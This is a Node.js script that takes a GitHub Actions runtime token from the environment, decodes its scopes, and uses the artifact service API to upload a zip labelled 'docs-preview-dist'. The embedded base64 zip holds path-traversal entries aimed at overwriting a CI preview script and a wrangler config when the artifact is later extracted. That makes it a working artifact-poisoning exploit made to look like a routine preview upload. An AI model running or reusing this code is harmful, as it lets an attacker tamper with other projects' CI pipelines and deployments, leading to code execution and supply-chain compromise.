const ZIP = Buffer.from(
  'UEsDBBQAAAAIADySXV2bzw/mfQEAAHsCAAAjAAAAeC8uLi8uLi8uLi8uLi9jaS9wcmV2aWV3L3ByZXZpZXcudHN1UsFqGzEQve9XzMVohY2WFprDgg9OsklNQ2xch1JKMPLudFfJRlKlWcdtyb9n1japE1JdBs08vTfvIfPgXSBwcQSNjk1r1iPoQstVBfzVYaSEYMxzhXZjgrOqRkrF2dXs5vziarIoVpP5dLWcfSmuxUgImdTvoC+ny883p8coH4zlwfzbdXGegybS5T0GKF2FgFssOzK2BmOBgRvTYo0VPLpw/7N1j6vQWbhz6380720DLdrxoILY6I+fTsaDKGAAKTdTki9e1X6aEu/ba6dSqga3lanZeCp/5B9ObuWLzLGNA31P2nPWjKLwO0+ADwfHIbxOUS32NRUNkY95lmlvVG2o6daqdA9ZQO9iJob/yW5RzGdfp8vZ4vsuQHaAusIQx3/FpKPGBfNHk3FW5OIUdeAsxbAeiUlZoiduau9bU+4g2cZWB+XhXeQnT3K39sHlfgK8HkTS1EXx9kcovjrPrvku1R4kE9z2UlDsCsuAjoD5MXNPiSG4wIwok2dQSwMEFAAAAAgAPJJdXRDQI00qAAAAKAAAABYAAAB4Ly4uLy4uL3dyYW5nbGVyLmpzb25jq1bKTSzKTi1SslIKCPdzddF19vdz83TXdQvy99V1DArxdHN0DlGq5QIAUEsDBBQAAAAIADySXV21uSVOCAAAAAYAAAAfAAAAeC8uLi8uLi8uLi9lc2NhcGVkLXBhY2thZ2VzLnR4dAsI93N14QIAUEsBAhQDFAAAAAgAPJJdXZvPD+Z9AQAAewIAACMAAAAAAAAAAAAAAIABAAAAAHgvLi4vLi4vLi4vLi4vY2kvcHJldmlldy9wcmV2aWV3LnRzUEsBAhQDFAAAAAgAPJJdXRDQI00qAAAAKAAAABYAAAAAAAAAAAAAAIABvgEAAHgvLi4vLi4vd3JhbmdsZXIuanNvbmNQSwECFAMUAAAACAA8kl1dtbklTggAAAAGAAAAHwAAAAAAAAAAAAAAgAEcAgAAeC8uLi8uLi8uLi9lc2NhcGVkLXBhY2thZ2VzLnR4dFBLBQYAAAAAAwADAOIAAABhAgAAAAA=',
  'base64'
);

const KEYS = ['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RESULTS_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_CACHE_URL', 'GITHUB_RUN_ID'];
console.log('env presence:', Object.fromEntries(KEYS.map(k => [k, process.env[k] ? 'present' : 'absent'])));

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = (process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL || '').replace(/\/$/, '');
if (!token || !base) { console.log('no runtime token/url available'); process.exit(0); }

const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
let runId, jobId;
for (const part of (claims.scp || '').split(' ')) {
  const p = part.split(':');
  if (p[0] === 'Actions.Results' && p.length === 3) { runId = p[1]; jobId = p[2]; }
}
if (!runId) { console.log('no Actions.Results scope'); process.exit(0); }

async function twirp(method, body) {
  const r = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await r.text();
  console.log(method, r.status, text.slice(0, 300));
  return JSON.parse(text);
}

(async () => {
  const created = await twirp('CreateArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    version: 4,
  });
  const signed = created.signedUploadUrl || created.signed_upload_url;
  const put = await fetch(signed, {
    method: 'PUT',
    headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip' },
    body: ZIP,
  });
  console.log('blob put', put.status);
  await twirp('FinalizeArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    size: String(ZIP.length),
  });
})().catch(e => { console.error(e); process.exit(1); });
